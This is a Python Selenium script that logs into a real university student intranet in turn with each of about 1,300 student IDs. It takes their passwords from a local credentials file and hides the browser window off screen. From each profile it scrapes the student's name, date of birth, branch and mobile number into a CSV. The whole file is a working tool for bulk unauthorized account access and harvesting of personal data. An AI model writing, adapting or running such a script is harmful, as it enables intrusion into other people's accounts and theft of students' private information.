from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By

options = webdriver.ChromeOptions()
options.add_experimental_option('detach', True)
driver = webdriver.Chrome(options=options, service=Service("C:chromedriver.exe"))

file = open("C:\\Users\\HI\\OneDrive\\Documents\\usersPass.txt")

getPass = {}
for details in file.read().splitlines():
    username, password = details.split(":")
    getPass[username] = password
file.close()

file = open("C:\\Users\\HI\\OneDrive\\Desktop\\n17.csv", 'a+')

for i in range(1,1300):
    try:
        username = "N17" + str(i).zfill(4)
        password = getPass[username]
        driver.set_window_position(-10000, 0)
        driver.get("https://intranet.rguktn.ac.in/SMS/")
        driver.find_element("id", "user1").send_keys(username)
        driver.find_element("id", "passwd1").send_keys(password)
        driver.find_element(By.CLASS_NAME, 'btn').click()
        driver.get("https://intranet.rguktn.ac.in/SMS/dashboard.php")
        driver.find_element(By.CLASS_NAME, 'fa-user').click()
        driver.find_element(By.LINK_TEXT,'View Profile').click()
        name = driver.find_element(By.TAG_NAME, 'h4').text
        details = driver.find_element(By.CLASS_NAME, 'text-danger').text
        branch = details.split(",")[-1].strip()[5:]
        mobile = driver.find_element(By.XPATH, '/html/body/div/div/section[2]/div[1]/div[1]/div/div/ul/li[5]/a').text
        dob = driver.find_element(By.XPATH, '/html/body/div/div/section[2]/div[1]/div[1]/div/div/ul/li[2]/a').text
        file.write("%s,%s,%s,%s,%s\n" % (username, name, dob, branch, mobile))
        driver.find_element(By.CLASS_NAME, 'dropdown-toggle').click()
        driver.find_element(By.LINK_TEXT, 'Sign out').click()
    except Exception as e:
        print(e)
file.close()
driver.close()
